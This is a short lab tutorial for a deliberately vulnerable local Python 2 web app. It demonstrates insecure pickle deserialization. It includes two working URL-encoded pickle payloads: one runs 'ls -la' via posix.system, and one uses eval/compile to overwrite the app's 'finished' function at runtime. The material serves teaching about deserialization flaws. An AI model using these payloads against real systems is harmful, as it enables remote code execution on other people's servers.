# Example 2: Modify Existing Function

## Project Setup

To startup an example navigate into the directory and start a docker container with the following command:  

```bash
sudo docker run -it --rm -v $(pwd):/app -p 8080:8080 python:2 bash
```  

This will start a docker container for Python 2.7. From here navigate into the directory and start the webserver with the following command:  

```bash
cd /app  
pip install -r requirements.txt
python index.py
```

## Using Payloads

With the webserver started, we can begin querying input with the 'pickle' parameter.

Use the included generate_pickle.py script to generate malicious input. You would then want to encode your input in URL form. This can be done in Burp Suite or [here](https://www.urlencoder.org/).

The following is an example payload to ```ls```.

```bash
cposix%0Asystem%0Ap1%0A%28S%27ls%20-la%27%0Ap2%0Atp3%0ARp4%0A.
```

You can see in the output of the server side that we have executed the ```ls``` command. What if we wanted to do something more malicious. Our next goal will be to overwrite an existing function. So long as the server does not error out, we will always call the ```finished``` function. Using the deserialization bug, we can replace this function.

To do this, use the following payload, or generate it with generate_pickle.py.

The idea is that we evaluate a compile function, and then pass in properly formatted python code. This allows us to execute arbitray Python code in the interpreter and affect the runtime environment. The following payload will modify the ```finished``` function until the application is restarted.

```bash
c__builtin__%0Aeval%0Ap1%0A%28S%27eval%28compile%28%22%22%22global%20finished%5Cndef%20finished%28%29%3A%5Cn%20%20%20%20return%20%5C%27hacked%5C%27%22%22%22%2C%20%5C%27%3Cstdin%3E%5C%27%2C%20%5C%27exec%5C%27%29%29%27%0Ap2%0Atp3%0ARp4%0A.
```
